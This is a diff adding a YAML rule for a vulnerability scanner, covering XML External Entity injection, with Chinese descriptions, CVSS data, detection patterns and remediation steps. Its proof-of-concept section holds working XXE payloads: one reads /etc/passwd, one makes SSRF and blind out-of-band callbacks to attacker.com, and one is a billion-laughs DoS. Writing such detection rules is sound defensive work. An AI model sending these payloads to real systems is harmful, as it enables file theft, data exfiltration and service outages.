@@ -1,0 +1,115 @@
+id: "rule-xxe"
+name: "XML External Entity (XXE)"
+name_cn: "XML 外部实体注入"
+description: "XML 解析器未禁用外部实体解析，导致攻击者可读取本地文件、发起 SSRF 请求或触发 DoS"
+
+owasp_category: "A05-security-misconfiguration"
+owasp_subcategory: "XML External Entities"
+cwe_id: "CWE-611"
+
+cvss:
+  vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
+  base_score: 9.1
+  severity: "critical"
+
+detection:
+  methods: ["DAST", "SAST"]
+  dast_signals:
+    high_specificity:
+      - type: "file_read_confirmed"
+        pattern: "response_contains_local_file_content"
+        confidence: 0.95
+      - type: "ssrf_callback"
+        pattern: "out_of_band_http_callback_received"
+        confidence: 0.95
+    medium_specificity:
+      - type: "xml_content_type"
+        pattern: "Content-Type: application/xml|text/xml"
+        confidence: 0.50
+      - type: "external_entity_in_response"
+        pattern: "<!ENTITY.*SYSTEM"
+        confidence: 0.70
+    low_specificity:
+      - type: "xml_endpoint"
+        pattern: "endpoint_accepts_xml_input"
+        confidence: 0.30
+  sast_patterns:
+    - language: "java"
+      pattern: "DocumentBuilderFactory.*setExpandEntityReferences\\(true\\)|SAXParser.*setFeature.*external-entities"
+      confidence: 0.75
+    - language: "python"
+      pattern: "xml\\.etree|lxml.*parser|xmlrpc"
+      confidence: 0.70
+  multi_layer:
+    enabled: true
+    min_signals: 2
+    high_specificity_skips_min: true
+  false_positive_filters:
+    - filter: "content_validation"
+      condition: "no_file_content_or_callback_in_response"
+      action: "downgrade"
+      target_confidence: "low"
+
+poc:
+  enabled: true
+  request_template: |
+    POST {{url}} HTTP/1.1
+    Host: {{host}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+    Content-Type: application/xml
+    Content-Length: {{len}}
+    Connection: close
+
+    {{payload}}
+  payloads:
+    - name: "local_file_read"
+      value: |
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <root>&xxe;</root>
+      description: "读取 /etc/passwd"
+      risk: "medium"
+    - name: "ssrf_http"
+      value: |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
+        <root>&xxe;</root>
+      description: "SSRF 外带 HTTP 回调"
+      risk: "medium"
+    - name: "blind_xxe_out_of_band"
+      value: |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>
+        <root>test</root>
+      description: "Blind XXE 外带数据"
+      risk: "high"
+    - name: "dos_billion_laughs"
+      value: |
+        <?xml version="1.0"?>
+        <!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>
+        <lolz>&lol2;</lolz>
+      description: "Billion Laughs DoS（仅测试环境）"
+      risk: "high"
+  verification:
+    - type: "content_match"
+      pattern: "root:.*:0:0:"
+      description: "响应中出现 /etc/passwd 内容"
+    - type: "callback_received"
+      description: "攻击者服务器收到 HTTP 回调"
+
+remediation:
+  priority: "P0"
+  summary: "禁用 XML 解析器的外部实体和 DTD 处理"
+  details:
+    - "禁用 DTD 处理（setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)）"
+    - "禁用外部实体解析（external-general-entities 和 external-parameter-entities 设为 false）"
+    - "使用安全的 XML 解析器配置"
+    - "对 XML 输入做严格的 Schema 校验"
+    - "首选 JSON 作为数据交换格式"
+  references:
+    - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    - "https://cwe.mitre.org/data/definitions/611.html"
+
+knowledge_source:
+  file: "知识库/xxe-test.md"
+  methodology: "知识库/xxe-test.md：file:/// SSRF / Blind OOB"
